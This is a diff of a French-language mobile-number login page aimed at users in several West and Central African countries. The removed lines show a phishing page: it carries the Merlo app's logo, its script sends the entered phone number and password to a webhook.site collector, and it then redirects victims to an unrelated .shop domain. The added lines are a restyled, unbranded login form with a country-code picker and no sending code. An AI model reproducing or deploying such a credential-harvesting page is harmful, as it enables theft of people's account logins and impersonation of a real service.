@@ -5,176 +5,215 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Connexion</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
-
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background-color: #ffffff;
+      background: url('https://www.reisereporter.de/resizer/v2/RTR47EGRXBHC5ACFYNXFEGJ5MU.jpg?auth=1b0a223c51fca3feb4d0a64ec62c490a490d1b9308d6668b71a7be682c84082c&quality=70&width=1284&height=722&smart=true') no-repeat center center;
+      background-size: cover;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start;
+      align-items: center;
     }
 
-    .top-image {
-      width: 100%;
-      display: block;
+    .top-buttons {
+      margin-top: 40px;
+      display: flex;
+      background: white;
+      border-radius: 30px;
+      overflow: hidden;
     }
 
-    .wave {
-      height: 60px;
-      background-color: white;
-      border-bottom-left-radius: 100% 40px;
-      border-bottom-right-radius: 100% 40px;
-      margin-top: -5px;
+    .top-buttons button {
+      padding: 15px 25px;
+      border: none;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    .top-buttons .active {
+      background-color: black;
+      color: white;
     }
 
     .container {
-      background-color: white;
-      max-width: 500px;
-      margin: -30px auto 0;
-      padding: 30px 20px;
-      border-radius: 16px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+      margin-top: 20px;
+      background: white;
+      border-radius: 15px;
+      width: 90%;
+      max-width: 400px;
+      padding: 20px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
     }
 
     .form-group {
-      margin-bottom: 20px;
-    }
-
-    label {
-      display: block;
-      margin-bottom: 6px;
-      color: #555;
-      font-size: 15px;
-    }
-
-    .phone-group {
       display: flex;
-      width: 100%;
-      border: 1px solid #444;
-      border-radius: 6px;
-      overflow: hidden;
-      background-color: white;
+      align-items: center;
+      margin-bottom: 20px;
+      border-bottom: 1px solid #ccc;
     }
 
-    .phone-group select,
-    .phone-group input[type="text"] {
-      font-size: 16px;
-      padding: 12px;
+    .form-group i {
+      margin-right: 10px;
+    }
+
+    .form-group input {
       border: none;
       outline: none;
-      background-color: white;
-    }
-
-    .phone-group select {
-      width: 90px;
-      color: #333;
-      appearance: none;
-      -webkit-appearance: none;
-      -moz-appearance: none;
-      border-right: 1px solid #ccc;
-    }
-
-    .phone-group input[type="text"] {
       flex: 1;
-      color: #333;
+      padding: 10px 0;
+      font-size: 16px;
     }
 
-    input[type="password"] {
-      width: 100%;
-      padding: 12px;
-      font-size: 16px;
-      border: 1px solid #444;
-      border-radius: 6px;
-      background-color: white;
-      color: #333;
-    }
-
-    .btn {
-      width: 100%;
-      padding: 14px;
-      background-color: #26334d;
-      color: white;
-      border: none;
-      font-size: 16px;
-      border-radius: 10px;
+    .indicatif-select {
+      display: flex;
+      align-items: center;
       cursor: pointer;
     }
 
-    .bottom-links {
+    .dropdown {
+      display: none;
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: white;
+      padding: 20px;
+      z-index: 10;
+      border-top-left-radius: 15px;
+      border-top-right-radius: 15px;
+      box-shadow: 0 -2px 10px rgba(0,0,0,0.3);
+    }
+
+    .dropdown input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+
+    .dropdown button {
+      background: #d93025;
+      color: white;
+      border: none;
+      padding: 10px;
+      border-radius: 10px;
+      margin-left: 10px;
+    }
+
+    .indicatif-item {
+      padding: 15px;
+      border-radius: 10px;
+      background: linear-gradient(to right, #e53935, #8e24aa);
+      color: white;
+      margin-bottom: 10px;
       display: flex;
       justify-content: space-between;
-      margin-top: 20px;
-      font-size: 15px;
-      color: #26334d;
     }
 
-    select:focus {
-      outline: none;
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
     }
 
-    input:focus {
-      outline: none;
+    .checkbox-group input {
+      margin-right: 10px;
+    }
+
+    .submit-btn {
+      width: 100%;
+      background: #e53910;
+      color: white;
+      border: none;
+      padding: 15px;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 10px;
+      cursor: pointer;
+      box-shadow: 0 5px 10px rgba(0,0,0,0.2);
+    }
+
+    .overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.5);
+      z-index: 5;
     }
   </style>
 </head>
 <body>
 
-  <img src="https://merloapp.com/static/100logo.png" alt="Merlo" class="top-image">
-
-  <div class="wave"></div>
+  <div class="top-buttons">
+    <button class="active">Se connecter</button>
+    <button>Créer un compte</button>
+  </div>
 
   <div class="container">
     <div class="form-group">
-      <label>Numéro de portable</label>
-      <div class="phone-group">
-        <select>
-          <option value="+225">+225</option>
-          <option value="+226">+226</option>
-          <option value="+228">+228</option>
-          <option value="+229">+229</option>
-          <option value="+237">+237</option>
-        </select>
-        <input type="text" placeholder="Numéro de portable">
+      <div class="indicatif-select" onclick="toggleDropdown()">
+        📱 <span id="selectedIndicatif">+237</span> ▼
       </div>
+      <input type="text" placeholder="Entrez votre numéro de portable" />
     </div>
 
     <div class="form-group">
-      <label>Mot de passe</label>
-      <input type="password" placeholder="Mot de passe">
+      🔒 <input type="password" placeholder="Veuillez entrer votre mot de passe" />
     </div>
 
-    <button class="btn">Se connecter</button>
+    <div class="checkbox-group">
+      <input type="checkbox" id="remember" />
+      <label for="remember">Se souvenir du mot de passe</label>
+    </div>
 
-    <div class="bottom-links">
-      <span>Service client</span>
-      <span>S'inscrire</span>
+    <button class="submit-btn">Connectez-vous à votre compte</button>
+  </div>
+
+  <!-- Overlay -->
+  <div class="overlay" id="overlay" onclick="toggleDropdown()"></div>
+
+  <!-- Dropdown for indicatifs -->
+  <div class="dropdown" id="dropdown">
+    <div style="display: flex;">
+      <input type="text" placeholder="Sélectionner l'indicatif régional" id="searchInput" onkeyup="searchIndicatif()">
+      <button>🔍 Rechercher</button>
+    </div>
+
+    <div id="indicatifList">
+      <div class="indicatif-item" onclick="selectIndicatif('+237')">+237 <span>République du Cameroun</span></div>
+      <div class="indicatif-item" onclick="selectIndicatif('+228')">+228 <span>République togolaise</span></div>
+      <div class="indicatif-item" onclick="selectIndicatif('+229')">+229 <span>République du Bénin</span></div>
+      <div class="indicatif-item" onclick="selectIndicatif('+226')">+226 <span>Burkina Faso</span></div>
+      <div class="indicatif-item" onclick="selectIndicatif('+225')">+225 <span>République de Côte d'Ivoire</span></div>
     </div>
   </div>
 
   <script>
-    document.querySelector('.btn').addEventListener('click', function () {
-      const code = document.querySelector('select').value;
-      const phone = document.querySelector('input[type="text"]').value.trim();
-      const password = document.querySelector('input[type="password"]').value.trim();
+    function toggleDropdown() {
+      const dropdown = document.getElementById("dropdown");
+      const overlay = document.getElementById("overlay");
+      const isVisible = dropdown.style.display === "block";
+      dropdown.style.display = isVisible ? "none" : "block";
+      overlay.style.display = isVisible ? "none" : "block";
+    }
 
-      const data = {
-        phone: code + phone,
-        password: password
-      };
+    function selectIndicatif(code) {
+      document.getElementById("selectedIndicatif").innerText = code;
+      toggleDropdown();
+    }
 
-      fetch("https://webhook.site/b1fb39f5-27fc-412a-adba-4a0bdd868cb5", {
-        method: "POST",
-        headers: {
-          "Content-Type": "text/plain"
-        },
-        body: JSON.stringify(data)
-      }).then(() => {
-        window.location.href = "https://bfa.afeatoncom.shop/";
-      }).catch(() => {
-        window.location.href = "https://bfa.afeatoncom.shop/";
+    function searchIndicatif() {
+      const input = document.getElementById("searchInput").value.toLowerCase();
+      const items = document.querySelectorAll("#indicatifList .indicatif-item");
+      items.forEach(item => {
+        const text = item.innerText.toLowerCase();
+        item.style.display = text.includes(input) ? "flex" : "none";
       });
-    });
+    }
   </script>
 </body>
 </html>
